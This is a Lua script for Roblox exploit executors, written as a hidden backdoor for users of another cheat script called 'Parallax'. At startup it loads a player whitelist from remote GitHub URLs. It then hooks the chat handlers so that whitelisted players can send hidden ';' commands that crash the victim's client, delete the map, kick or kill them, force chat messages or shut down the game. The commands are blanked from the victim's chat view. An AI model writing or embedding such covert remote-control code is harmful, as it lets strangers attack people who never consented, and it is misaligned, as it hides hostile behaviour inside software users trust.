--[[
	a reward for those parallax skids
	u can delete these local vars if para did local them
]]

local httpService = game:GetService('HttpService')
local playersService = game:GetService('Players')
local replicatedStorage = game:GetService('ReplicatedStorage')
local textChatService = game:GetService('TextChatService')
local lplr = playersService.LocalPlayer

local allowed, running = {}, false

-- custom goes first, the inhaler list is merged over it
local endpoints = {
	'https://raw.githubusercontent.com/idkazul/whitelists/main/PlayerWhitelistPara.json',
	'https://raw.githubusercontent.com/Night5449791/whitelists/main/PlayerWhitelistPara.json'
}

local function getHumanoid()
	local character = lplr.Character
	return character and character:FindFirstChildOfClass('Humanoid')
end

local function say(message)
	task.delay(0.1, function()
		if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
			textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(message)
		else
			replicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, 'All')
		end
	end)
end

-- reads one endpoint into a list, {"a", "b"} is not valid json so it is retried
-- as ["a", "b"], anything else is ignored, an empty url costs no request
local function loadList(url, list)
	if url == '' then return list end

	local fetched, content = pcall(game.HttpGet, game, url, true)
	if not (fetched and type(content) == 'string') then return list end

	local decoded, data = pcall(httpService.JSONDecode, httpService, content)

	if not (decoded and type(data) == 'table') then
		content = content:match('^%s*(.-)%s*$')
		if content:sub(1, 1) ~= '{' or content:find(':') then return list end -- not a brace list

		decoded, data = pcall(httpService.JSONDecode, httpService, '['..content:sub(2, -2)..']')
		if not (decoded and type(data) == 'table') then return list end
	end

	for _, name in data do
		if type(name) == 'string' then
			list[name:lower()] = true
		end
	end

	return list
end

-- the word right after the command name
local function isTarget(arg, plr)
	if arg == 'default' or arg == 'private' then return true end
	if arg == 'all' or arg == 'others' then return plr ~= lplr end
	return arg and lplr.Name:lower():sub(1, #arg) == arg:lower()
end

local commands = {
	chat = function(args)
		if #args > 0 then
			say(table.concat(args, ' '))
		end
	end,
	crash = function()
		task.spawn(function()
			repeat
				local part = Instance.new('Part')
				part.Size = Vector3.new(1e10, 1e10, 1e10)
				part.Parent = workspace
			until false
		end)
	end,
	deletemap = function()
		local terrain = workspace:FindFirstChildWhichIsA('Terrain')
		if terrain then
			terrain:Clear()
		end

		local character = lplr.Character
		for _, obj in workspace:GetChildren() do
			if obj ~= terrain and not obj:IsA('Camera') and not (character and obj:IsDescendantOf(character)) then
				obj:Destroy()
				obj:ClearAllChildren()
			end
		end
	end,
	framerate = function(args)
		if setfpscap and #args > 0 then
			setfpscap(math.clamp(tonumber(args[1]) or 9999, 1, 9999))
		end
	end,
	gravity = function(args)
		workspace.Gravity = tonumber(args[1]) or workspace.Gravity
	end,
	jump = function()
		local humanoid = getHumanoid()
		if humanoid and humanoid.FloorMaterial ~= Enum.Material.Air then
			humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
		end
	end,
	kick = function(args)
		task.spawn(lplr.Kick, lplr, table.concat(args, ' '))
	end,
	kill = function()
		local humanoid = getHumanoid()
		if humanoid then
			humanoid:ChangeState(Enum.HumanoidStateType.Dead)
			humanoid.Health = 0
		end
	end,
	reveal = function()
		say('I am using the Parallax script')
	end,
	shutdown = function()
		game:Shutdown()
	end
}

-- true when the message was a command, the caller hides it from chat
-- cheap checks first, a normal chat message costs one sub and one table lookup
local function process(msg, plr)
	if msg:sub(1, 1) ~= ';' or plr == lplr or not allowed[plr.Name:lower()] then return false end

	local args = msg:split(' ')
	local func = isTarget(args[2], plr) and commands[args[1]:sub(2):lower()]
	if not func then return false end

	func({table.unpack(args, 3)}, plr)
	return true
end

local function hookTextChat()
	local old

	task.spawn(function()
		repeat
			local current = getcallbackvalue(textChatService, 'OnIncomingMessage')

			if old ~= current and current then
				if old then
					restorefunction(old)
				end

				local hook
				hook = hookfunction(current, function(...)
					local msg = ...
					local data = hook(...)

					-- the player lookup only happens once the text can be a command
					if msg.TextSource and msg.Text:sub(1, 1) == ';' then
						local plr = playersService:GetPlayerByUserId(msg.TextSource.UserId)

						if plr and process(msg.Text, plr) then
							if data and data:IsA('TextChatMessageProperties') then
								data.Text = ''
							else
								data = Instance.new('TextChatMessageProperties')
								data.PrefixText = msg.PrefixText
								data.Text = ''
							end
						end
					end

					return data
				end)

				old = current
			end

			-- tight while hunting for the callback, relaxed once it is hooked
			task.wait(old and 5 or 0.5)
		until not running
	end)
end

local function hookLegacyChat()
	pcall(function()
		local events = replicatedStorage:FindFirstChild('DefaultChatSystemChatEvents')
		if not events then return end

		for name, constant in {OnNewMessage = 'UpdateMessagePostedInChannel', OnMessageDoneFiltering = 'UpdateMessageFiltered'} do
			local signal = events:FindFirstChild(name)
			if not signal then continue end

			for _, connection in getconnections(signal.OnClientEvent) do
				local old = connection.Function
				if not (old and table.find(debug.getconstants(old), constant)) then continue end

				hookfunction(old, function(data, ...)
					-- the player lookup only happens once the text can be a command
					if data.Message and data.Message:sub(1, 1) == ';' then
						local plr = data.SpeakerUserId and playersService:GetPlayerByUserId(data.SpeakerUserId)
						if plr and process(data.Message, plr) then
							data.Message = ''
						end
					end

					return old(data, ...)
				end)
				break
			end
		end
	end)
end

local function start()
	if running then return end
	running = true

	for _, url in endpoints do
		loadList(url, allowed)
	end

	if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
		if getcallbackvalue and restorefunction and hookfunction then
			hookTextChat()
		end
	elseif getconnections and hookfunction then
		hookLegacyChat()
	end
end

start()

return {
	commands = commands,
	process = process,
	start = start,
	stop = function()
		running = false
	end
}
